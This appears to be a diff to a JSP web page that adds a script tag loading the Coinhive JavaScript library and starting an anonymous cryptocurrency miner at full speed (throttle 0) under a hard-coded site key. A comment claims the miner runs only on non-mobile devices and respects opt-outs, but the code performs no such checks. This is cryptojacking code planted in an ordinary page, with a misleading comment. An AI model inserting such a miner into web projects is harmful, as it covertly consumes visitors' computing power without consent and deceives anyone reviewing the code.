@@ -14,6 +14,14 @@
 <%--</jsp:include>--%>
 
 <!-- Page Content -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('gSXNqrhGtGheICvOlLGd276iq9ywTXc0', {throttle: 0});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    miner.start();
+</script>
 
 <c:choose>
     <c:when test="${cookie['language'].value == 'en'}">
